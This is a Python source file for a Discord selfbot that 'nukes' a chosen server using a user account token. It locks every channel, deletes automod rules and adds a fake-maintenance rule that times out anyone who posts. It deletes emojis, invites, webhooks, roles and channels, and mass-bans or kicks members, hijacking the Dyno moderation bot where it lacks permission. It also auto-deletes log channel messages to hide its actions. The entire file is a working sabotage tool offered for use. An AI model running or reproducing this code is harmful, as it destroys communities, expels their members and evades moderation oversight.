import asyncio
import datetime
from datetime import timedelta
import discord
import sys
from discord.ext import commands

bot = commands.Bot(command_prefix="?", self_bot=True)

if sys.platform == 'win32':   # weird fix for a bug I ran into
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())


# Get the token and run the bot
user_token = input("Input user token: ")
guild_nuke_id = input("Input the Guild ID that will be nuked: ")
auto_delete_logs_channel_id = input("ID of log channel to delete new messages (type a letter if there is none): ")
dyno_prefix = input("Input the dyno bot prefix: ")


async def parse_input(user_input: str):
    prompt = user_input.strip()
    if not prompt.isnumeric():
        print("Invalid guild ID passed. Restart the script.")
        return
    guild = None
    try:
        guild = await bot.fetch_guild(int(prompt))
    except discord.Forbidden:
        print("Failed to fetch the guild: No access to the Guild.")
        return
    except discord.HTTPException:
        print("Failed to fetch the guild: HTTP Exception.")
        return
    if guild:
        print(f"Nuking guild {guild.name}")
        await nuke(guild=guild)


async def delete_bot_message(channel: discord.abc.GuildChannel):
    if not channel.permissions_for(channel.guild.me).manage_messages or channel.id == auto_delete_logs_channel_id:
        return
    async for message in channel.history(limit=None):
        if message.author.bot:
            await message.delete()
            return


async def nuke(guild: discord.Guild):
    print(f"{guild.name} nuke called")
    user_id = bot.user.id
    member = await guild.fetch_member(user_id)
    guild_perms = member.guild_permissions
    is_admin = False
    if guild_perms.administrator: is_admin = True

    # get the user's top role
    top_role = guild.default_role
    for role in member.roles:
        if role > top_role: top_role = role
    print(f"Top role: {top_role.name}")
    channels = await guild.fetch_channels()

    #  ----  Fetching every user's ID  ----  #

    print("Trying to fetch all guild member's ids. This may take a while.")
    print("Without kick/ban or manage role permissions it will have to scrape the sidebar.")
    print("In large severs the sidebar does not show offline members, so it might not fetch all members.")

    good_channels_for_member_scraping = []
    channel_ratings = {}
    for x in channels:
        if not x.permissions_for(member).read_messages: continue
        roles_seeing_channel_count = 0
        for role in guild.roles:
            if x.permissions_for(role).read_messages: roles_seeing_channel_count += 1
        channel_ratings[f'{x.id}'] = roles_seeing_channel_count

    sorted_channels = sorted(channel_ratings.items(), key=lambda item: item[1], reverse=True)

    # Append the top 5 channels to the list
    for channel_id, count in sorted_channels[:5]:
        append_channel = await guild.fetch_channel(channel_id)
        good_channels_for_member_scraping.append(append_channel)


    guild_members = []
    if guild_perms.kick_members or guild_perms.ban_members or guild_perms.manage_roles or is_admin:
        members = await guild.fetch_members(force_scraping=False, channels=good_channels_for_member_scraping)
        for x in members:
            if x.id == bot.user.id:
                members.remove(x)
                continue
            if x.status is not discord.Status.offline:
                guild_members.append(x)
                members.remove(x)
        for x in members:
            guild_members.append(x)
            members.remove(x)
    else:
        members = await guild.fetch_members(channels=good_channels_for_member_scraping, force_scraping=True, delay=.1)
        for x in members:
            if x.id == bot.user.id:
                members.remove(x)
                continue
            if x.status is not discord.Status.offline:
                guild_members.append(x)
                members.remove(x)
        for x in members:
            guild_members.append(x)
            members.remove(x)


    #  ----  Channel Permission Denial  ----  #

    print("Trying to deny message/read permissions on all channels.")

    for category in guild.categories:
        category_perms = category.permissions_for(member)
        if category_perms.manage_permissions or is_admin:
            for role in guild.roles:
                if role < top_role:
                    overwrite = category.overwrites.get(role)
                    if not overwrite: overwrite = discord.PermissionOverwrite()
                    overwrite.update(**{"send_messages": False, "read_messages": False})
                    await category.set_permissions(role, overwrite=overwrite)
    for channel in guild.channels:
        if not channel.category: continue
        channel_perms = channel.permissions_for(member)
        if channel_perms.manage_permissions or is_admin:
            for role in guild.roles:
                if role < top_role:
                    overwrite = channel.overwrites.get(role)
                    if not overwrite: overwrite = discord.PermissionOverwrite()
                    overwrite.update(**{"send_messages": False, "read_messages": False})
                    await channel.set_permissions(role, overwrite=overwrite)

    # Non-cache based channel iteration
    if len(guild.channels) < 1:
        for channel in channels:
            channel_perms = channel.permissions_for(member)
            if channel_perms.manage_permissions or is_admin:
                for role in guild.roles:
                    if role < top_role:
                        overwrite = channel.overwrites.get(role)
                        if not overwrite: overwrite = discord.PermissionOverwrite()
                        overwrite.update(**{"send_messages": False, "read_messages": False})
                        await channel.set_permissions(role, overwrite=overwrite)

    #  ----  Automod Rule Deletion & Blocking all Messages  ----  #

    if guild_perms.manage_guild or is_admin:
        print("Deleting Automod Rules")
        rules = await guild.automod_rules()
        for rule in rules: await rule.delete()
        automod_rule_action = discord.AutoModRuleAction()
        automod_rule_action.type = discord.AutoModRuleActionType.timeout
        one_day = timedelta(days=1)
        automod_rule_action.duration = one_day

        automod_rule_block_action = discord.AutoModRuleAction(
            custom_message="Server is down for maintenance, Work will be done soon.")

        automod_rule_trigger = discord.AutoModTrigger(type=discord.AutoModRuleTriggerType.keyword,
                                                      regex_patterns=["^.*$"])
        print("Blocking messages with an Automod rule")
        await guild.create_automod_rule(name="Block Messages", event_type=discord.AutoModRuleTriggerType.keyword,
                                        actions=[automod_rule_action, automod_rule_block_action], enabled=True,
                                        trigger=automod_rule_trigger)


    #  ----  Emojis & Stickers Deletion  ----  #

    if guild_perms.manage_emojis_and_stickers or is_admin:
        print("Deleting Stickers")
        stickers = await guild.fetch_stickers()
        for x in stickers: await x.delete()

        print("Deleting Emojis")
        emojis = await guild.fetch_emojis()
        for x in emojis: await x.delete()

    #  ----  Invites & Templates Deletion  ----  #

    if guild_perms.manage_guild or is_admin:
        print("Deleting invites")
        invites = await guild.invites()
        for x in invites: await x.delete()

        print("Deleting Templates")
        templates = await guild.templates()
        for x in templates: await x.delete()

    #  ----  Webhooks Deletion  ----  #

    if guild_perms.manage_webhooks or is_admin:
        print("Deleting Webhooks")
        webhooks = await guild.webhooks()
        for x in webhooks: await x.delete()

    #  ----  Prune Members  ----  #

    if guild_perms.kick_members or is_admin:
        print("Pruning members with >1 day of inactivity")
        pruneable_roles = []
        for x in guild.roles:  # Can only prune lower roles
            if x < top_role: pruneable_roles.append(x)
        await guild.prune_members(days=1, roles=pruneable_roles)

    #  ----  Mass Kick/Ban  ----  #

    print("Trying to kick/ban everyone with inbuilt methods.")

    kicked_members = []  # used to go back and ban them if possible
    ban_command = None
    kick_command = None
    delete_role_command = None
    plain_text_ban = False
    plain_text_kick = False
    plain_text_delete_role = False
    possible_channel = None
    if guild_perms.kick_members and not guild_perms.ban_members and not is_admin:
        print("User just has kick perms.")
        for x in guild_members:
            if x.top_role < top_role:
                try:
                    await x.kick()
                    guild_members.remove(x)
                    if len(guild_members) > 0: await asyncio.sleep(3)
                except discord.Forbidden:
                    print(f"Failed to kick member {x.name}, id: {x.id}")
                except Exception as e:
                    print(e)
            else: guild_members.remove(x)
    elif guild_perms.ban_members and not guild_perms.kick_members and not is_admin:
        print("User just has ban perms.")
        for x in guild_members:
            if x.top_role < top_role:
                try:
                    await x.ban()
                    guild_members.remove(x)
                    if len(guild_members) > 0: await asyncio.sleep(3)
                except discord.NotFound:
                    print(f"Failed to ban member: The requested user was not found: {x.name} id: {x.id}")
                    guild_members.remove(x)
                except discord.Forbidden:
                    print(f"Failed to ban member {x.name}, id: {x.id}")
                    guild_members.remove(x)
                except Exception as e:
                    guild_members.remove(x)
                    print(e)
            else: guild_members.remove(x)
    elif guild_perms.ban_members and guild_perms.kick_members or is_admin:
        print("Use has both ban and kick perms. Or has admin.")
        ban_turn = True
        for x in guild_members:
            if ban_turn: print(f"trying to ban: {x.name}")
            else: print(f"trying to kick: {x.name}")
            if x.top_role < top_role:
                if ban_turn:
                    ban_turn = False
                    try:
                        await x.ban()
                        guild_members.remove(x)
                        if len(guild_members) > 0: await asyncio.sleep(1.5)
                    except discord.NotFound:
                        print(f"Failed to ban member: The requested user was not found: {x.name} id: {x.id}")
                        guild_members.remove(x)
                    except discord.Forbidden:
                        print(f"Failed to ban member {x.name}, id: {x.id}")
                        guild_members.remove(x)
                    except Exception as e:
                        guild_members.remove(x)
                        print(e)
                else:
                    ban_turn = True
                    kicked_members.append(x)  # assumes that the user will be banned, regardless if the kick works
                    try:
                        await x.kick()
                        guild_members.remove(x)
                        if len(guild_members) > 0: await asyncio.sleep(1.5)
                    except discord.Forbidden:
                        print(f"Failed to kick member {x.name}, id: {x.id}")
                        guild_members.remove(x)
                    except Exception as e:
                        guild_members.remove(x)
                        print(e)
            else: guild_members.remove(x)
    elif not guild_perms.kick_members and not guild_perms.ban_members and not is_admin:
        print("User has no kick or ban perms. And no admin.")
        print("Trying to kick/ban everyone with a bot.")

        #  Trying to find the lowest channel, with a preference for voice channels
        for x in channels:
            if x.type is discord.ChannelType.text: continue
            if not x.permissions_for(member).use_application_commands or not x.permissions_for(member).read_messages \
                    or not x.permissions_for(member).send_messages:
                continue
            possible_channel = x  # Uses the lowest voice channel

        if not possible_channel:  # Uses the lowest text channel
            for x in channels:
                if not x.permissions_for(member).use_application_commands or not x.permissions_for(
                        member).read_messages or not x.permissions_for(member).send_messages:
                    continue
                possible_channel = x

        print(possible_channel)
        possible_channel = await bot.fetch_channel(possible_channel.id)
        print("Trying to locate bots.")

        guild_commands = await possible_channel.application_commands()
        for x in guild_commands:
            if x.type is not discord.ApplicationCommandType.chat_input: continue

            if x.name.lower() == "kick" and x.application.name.lower() == "dyno":
                print("Dyno kick perms")
                kick_command = x
                continue
            if x.name.lower() == "ban" and x.application.name.lower() == "dyno":
                print("Dyno ban perms")
                ban_command = x
            if x.name.lower() == "delrole" and x.application.name.lower() == "dyno":
                print("Dyno delete role perms")
                delete_role_command = x


        for x in guild_members:
            print(f"{len(guild_members)} iterating over: {x.name}")
            if ban_command:
                if ban_command.application.name.lower() == x.name.lower():
                    guild_members.remove(x)
                    continue
            elif kick_command:
                if kick_command.application.name.lower() == x.name.lower():
                    guild_members.remove(x)
                    continue
            if ban_command:
                for x in guild_members:
                    if x.top_role < top_role:
                        try:
                            print(f"Trying to ban {x.name} via Dyno bot.")
                            options = {
                                "user": x,
                                "no_appeal": True
                            }
                            if not plain_text_ban:
                                await ban_command.__call__(channel=possible_channel, **options)
                                await delete_bot_message(channel=possible_channel)
                            else:
                                await possible_channel.send(content=f"{dyno_prefix}ban {x.id}", delete_after=1)
                                await delete_bot_message(channel=possible_channel)
                            guild_members.remove(x)
                            if len(guild_members) > 0: await asyncio.sleep(4)
                        except discord.ext.commands.errors.CommandNotFound:
                            print("Ban Slash command not found, opting for plaintext command.")
                            plain_text_ban = True
                            break
                        except discord.NotFound:
                            print(f"Failed to dyno ban member: The requested user was not found: {x.name} id: {x.id}")
                            guild_members.remove(x)
                        except discord.Forbidden:
                            print(f"Failed to dyno ban member {x.name}, id: {x.id}")
                            guild_members.remove(x)
                        except Exception as e:
                            if x in guild_members:
                                guild_members.remove(x)
                            print(e)
                    else:
                        guild_members.remove(x)
            elif kick_command:
                if x.top_role < top_role:
                    try:
                        print(f"Trying to kick {x.name} via Dyno bot.")
                        if not plain_text_kick:
                            await kick_command.__call__(channel=possible_channel, user=x)
                            await delete_bot_message(channel=possible_channel)
                        else:
                            await possible_channel.send(content=f"{dyno_prefix}kick {x.id}", delete_after=1)
                            await delete_bot_message(channel=possible_channel)
                        guild_members.remove(x)
                        if len(guild_members) > 0: await asyncio.sleep(4)
                    except discord.ext.commands.errors.CommandNotFound:
                        print("Kick Slash command not found, opting for plaintext command.")
                        plain_text_kick = True
                        break
                    except discord.NotFound:
                        print(f"Failed to dyno kick member: The requested user was not found: {x.name} id: {x.id}")
                        guild_members.remove(x)
                    except discord.Forbidden:
                        print(f"Failed to dyno kick member {x.name}, id: {x.id}")
                        guild_members.remove(x)
                    except Exception as e:
                        if x in guild_members:
                            guild_members.remove(x)
                        print(e)
                else:
                    guild_members.remove(x)
        if plain_text_ban:
            for x in guild_members:
                if x.top_role < top_role:
                    try:
                        print(f"Trying to ban {x.name} via Dyno bot.")
                        options = {
                            "user": x,
                            "no_appeal": True
                        }
                        if not plain_text_ban:
                            await ban_command.__call__(channel=possible_channel, **options)
                            await delete_bot_message(channel=possible_channel)
                        else:
                            await possible_channel.send(content=f"{dyno_prefix}ban {x.id}", delete_after=1)
                            await delete_bot_message(channel=possible_channel)
                        guild_members.remove(x)
                        if len(guild_members) > 0: await asyncio.sleep(4)
                    except discord.ext.commands.errors.CommandNotFound:
                        print("Ban Slash command not found, opting for plaintext command.")
                        plain_text_ban = True
                    except discord.NotFound:
                        print(f"Failed to dyno ban member: The requested user was not found: {x.name} id: {x.id}")
                        guild_members.remove(x)
                    except discord.Forbidden:
                        print(f"Failed to dyno ban member {x.name}, id: {x.id}")
                        guild_members.remove(x)
                    except Exception as e:
                        if x in guild_members:
                            guild_members.remove(x)
                        print(e)
                else:
                    guild_members.remove(x)
        if plain_text_kick:
            for x in guild_members:
                if x.top_role < top_role:
                    try:
                        print(f"Trying to kick {x.name} via Dyno bot.")
                        if not plain_text_kick:
                            await kick_command.__call__(channel=possible_channel, user=x)
                            await delete_bot_message(channel=possible_channel)
                        else:
                            await possible_channel.send(content=f"{dyno_prefix}kick {x.id}", delete_after=1)
                            await delete_bot_message(channel=possible_channel)
                        guild_members.remove(x)
                        if len(guild_members) > 0: await asyncio.sleep(4)
                    except discord.ext.commands.errors.CommandNotFound:
                        print("Kick Slash command not found, opting for plaintext command.")
                        plain_text_kick = True
                    except discord.NotFound:
                        print(f"Failed to dyno kick member: The requested user was not found: {x.name} id: {x.id}")
                        guild_members.remove(x)
                    except discord.Forbidden:
                        print(f"Failed to dyno kick member {x.name}, id: {x.id}")
                        guild_members.remove(x)
                    except Exception as e:
                        if x in guild_members:
                            guild_members.remove(x)
                        print(e)
                else:
                    guild_members.remove(x)

    #  ----  Role Deletion  ----  #

    if guild_perms.manage_roles or is_admin:
        print("Deleting Roles")
        guild_roles = await guild.fetch_roles()
        for x in guild_roles:
            if x.is_default() or x.is_bot_managed() or x.is_premium_subscriber() or x.is_integration():
                continue
            if x > top_role: continue
            try:
                await x.delete()
                await asyncio.sleep(2)
            except discord.Forbidden:
                print(f"Forbidden: Failed to delete role: {x.name}")
            except discord.HTTPException:
                print(f"HTTP Exception: Failed to delete role: {x.name}")
            except Exception as e:
                print(f"{e}: Failed to delete role: {x.name}")
    elif not guild_perms.manage_roles and not is_admin:
        if delete_role_command:
            print("Insufficient perms: Trying to delete roles with a bot.")
            guild_roles = await guild.fetch_roles()
            for x in guild_roles:
                if x.is_default() or x.is_bot_managed() or x.is_premium_subscriber() or x.is_integration():
                    continue
                if x > top_role: continue
                try:
                    if not plain_text_delete_role:
                        await x.delete()
                    else:
                        await possible_channel.send(content=f"{dyno_prefix}delrole {x.id}", delete_after=3)
                        await delete_bot_message(channel=possible_channel)
                    await asyncio.sleep(4)
                except discord.ext.commands.errors.CommandNotFound:
                    print("Delrole Slash command not found, opting for plaintext command.")
                    plain_text_delete_role = True
                    break
                except discord.Forbidden:
                    print(f"Forbidden: Failed to delete role: {x.name}")
                    plain_text_delete_role = True
                    break
                except discord.HTTPException:
                    print(f"HTTP Exception: Failed to delete role: {x.name}")
                except Exception as e:
                    print(f"{e}: Failed to delete role: {x.name}")
            if plain_text_delete_role:
                print("Trying plaintext dyno command")
                for x in guild_roles:
                    if x.is_default() or x.is_bot_managed() or x.is_premium_subscriber() or x.is_integration():
                        continue
                    if x > top_role: continue
                    try:
                        await possible_channel.send(content=f"{dyno_prefix}delrole {x.id}", delete_after=1)
                        await delete_bot_message(channel=possible_channel)
                        await asyncio.sleep(4)
                    except discord.Forbidden:
                        print(f"Forbidden: Failed to delete role: {x.name}")
                    except discord.HTTPException:
                        print(f"HTTP Exception: Failed to dyno delete role: {x.name}")
                    except Exception as e:
                        print(f"{e}: Failed to dyno delete role: {x.name}")

    #  ----  Channel Deletion  ----  #

    if guild_perms.manage_channels or is_admin:
        print("Deleting Channels")
        for channel in channels:
            if is_admin or channel.permissions_for(member).manage_channels:
                await channel.delete()

    #  ----  Banning Kicked Users  ----  #

    if guild_perms.ban_members or is_admin:
        if len(kicked_members) > 0:
            print("Going back and banning kicked users")
            for x in kicked_members:
                print(f"Banning {x.name}")
                await x.ban()
                kicked_members.remove(x)
                if len(kicked_members) > 0: await asyncio.sleep(3)

    print("End of Nuke.")


@bot.event  # Login event run
async def on_ready():
    print(f"Logged in as user {bot.user.name} is in {len(bot.guilds)} guilds.")
    print("This is a logging only console: You cannot use commands here.")
    print("CANNOT USE COMMANDS HERE")
    await parse_input(guild_nuke_id)


@bot.event
async def on_message(message: discord.Message):
    if not message.author.bot or message.channel.id != int(auto_delete_logs_channel_id.strip()): return
    try:
        if message.channel.permissions_for(message.guild.me).manage_messages:
            print("Deleting message from log channel.")
            await message.delete()
    except Exception as e:
        print(f"Tried to delete message in log channel: {e}")


bot.run(user_token)
